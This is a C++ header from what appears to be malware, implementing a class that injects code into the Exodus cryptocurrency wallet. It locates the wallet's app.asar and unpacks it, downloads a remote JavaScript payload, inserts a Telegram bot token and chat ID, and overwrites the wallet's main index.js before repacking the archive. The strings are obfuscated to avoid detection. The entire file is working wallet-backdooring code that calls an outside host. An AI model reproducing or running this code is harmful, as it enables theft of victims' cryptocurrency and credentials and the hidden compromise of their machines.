#ifndef EXODUS_HPP
#define EXODUS_HPP

namespace fs = std::filesystem;

class Exodus {
public:
    void Inject(std::string ChatID, std::string Token) {
        try {
            DEBUG_PRINT(L"Starting Exodus Injection");
            fs::path asarPath = GetExodusPath();
            if (!fs::exists(asarPath)) {
                DEBUG_PRINT(L"ASAR Not found");
                throw std::runtime_error(OBF("Exodus ASAR not found"));
            }

            fs::path tempDir = fs::temp_directory_path() / RandomString(5);
            fs::create_directories(tempDir);
            DEBUG_PRINT(L"Saving");
            AsarTools::AsarUnpacker parser(asarPath.string());
            parser.extract_all(tempDir.string());
            DEBUG_PRINT(L"Exracted");
            std::string newContent = FetchUrl(
                OBF(L"raw.githubusercontent.com"),
                OBF(L"get injection at : t.me/NyxEnigma"),
                true
            );

            newContent = Replace(newContent, "%TOKEN%", Token); // Token is base64 encoded when passed to the Func
            newContent = Replace(newContent, "%CHAT%", ChatID); // Same here

            DEBUG_PRINT(L"Replaced");

            AsarTools::OverWrite(tempDir, OBF("src/app/main/index.js"), newContent);
            DEBUG_PRINT(L"Overwritten");
            fs::path modifiedAsar = asarPath.parent_path() / (OBF("app_") + RandomString(5) + OBF(".asar"));
            AsarTools::AsarPacker builder(tempDir.string(), modifiedAsar.string());
            builder.pack();
            DEBUG_PRINT(L"Builded");

            fs::remove(asarPath);
            fs::rename(modifiedAsar, asarPath);

            fs::remove_all(tempDir);
        }
        catch (const std::exception& e) {
            throw;
        }
    }

private:
    fs::path GetAppDataPath() {
        char appDataPath[MAX_PATH];

        HRESULT result = SHGetFolderPathA(
            NULL,
            CSIDL_LOCAL_APPDATA,
            NULL,
            SHGFP_TYPE_CURRENT,
            appDataPath
        );

        if (result != S_OK) {
            throw std::runtime_error(OBF("Failed to locate AppData directory"));
        }

        return fs::path(appDataPath);
    }

    struct AppVersion {
        int major;
        int minor;
        int patch;

        bool operator>(const AppVersion& other) const {
            return std::tie(major, minor, patch) >
                std::tie(other.major, other.minor, other.patch);
        }
    };

    fs::path GetExodusPath() { 
        fs::path basePath = GetAppDataPath() / OBF("exodus");

        std::vector<std::pair<fs::path, AppVersion>> appFolders;

        for (const auto& entry : fs::directory_iterator(basePath)) {
            if (entry.is_directory()) {
                std::string folderName = entry.path().filename().string();
                if (folderName.find(OBF("app-")) == 0) {
                    AppVersion version = ParseVersion(folderName);
                    if (version.major != -1) {
                        appFolders.emplace_back(entry.path(), version);
                    }
                }
            }
        }

        if (appFolders.empty()) {
            throw std::runtime_error(OBF("No valid Exodus app folders found"));
        }

        std::sort(appFolders.begin(), appFolders.end(),
            [](const auto& a, const auto& b) { return a.second > b.second; });

        fs::path latestFolder = appFolders.front().first;
        fs::path asarPath = latestFolder / OBF("resources") / OBF("app.asar");

        if (!fs::exists(asarPath)) {
            throw std::runtime_error(OBF("ASAR file missing in latest version"));
        }

        return asarPath;
    }

    AppVersion ParseVersion(const std::string& folderName) {
        // Exouds Path Structure is %LocalAppdata%/exodus/app-*/ressources/app.asar so we have to get the latest version first
        AppVersion version{ -1, -1, -1 };
        try {
            size_t dashPos = folderName.find('-');
            if (dashPos != std::string::npos) {
                std::string verStr = folderName.substr(dashPos + 1);
                std::replace(verStr.begin(), verStr.end(), '.', ' ');

                std::istringstream iss(verStr);
                iss >> version.major >> version.minor >> version.patch;
            }
        }
        catch (...) {
            // js invalid format
        }
        return version;
    }

    static std::string RandomString(int length) {
        static const std::string chars = OBF("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
        std::random_device rd;
        std::mt19937 generator(rd());
        std::uniform_int_distribution<> dist(0, chars.size() - 1);

        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; ++i) {
            result += chars[dist(generator)];
        }
        return result;
    }

    static std::string Replace(std::string org, const std::string& Target, const std::string& Replacement) {
        try {
            if (Target.empty()) return org;
            size_t pos = 0;
            while ((pos = org.find(Target, pos)) != std::string::npos) {
                org.replace(pos, Target.length(), Replacement);
                pos += Replacement.length();
            }
            return org;
        }
        catch (...) {
            return org;
        }
    }
};

#endif